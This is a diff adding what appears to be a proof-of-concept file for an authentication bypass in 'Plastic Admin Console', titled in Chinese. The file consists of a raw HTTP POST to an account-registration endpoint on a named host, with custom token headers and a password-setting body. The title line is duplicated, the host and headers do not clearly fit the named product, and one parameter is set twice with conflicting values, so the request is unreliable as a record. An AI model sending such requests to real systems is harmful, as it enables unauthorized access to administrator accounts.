@@ -1,0 +1,10 @@
+# Plastic Admin Console 认证绕过漏洞
+# Plastic Admin Console 认证绕过漏洞
+POST /account/register?acid=80001478&bid=hd_tag_m8mv2604 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2604
+RM-PRO-Token: 2f98aa4357ea4a08357a763c6721bd42
+RM-PRO-Time: 1742808518717
+User-Agent: curl/7.83.1
+
+Password=randstr&ConfirmPassword=randstr&RememberMe=true&__RequestVerificationToken=csrf&RememberMe=false
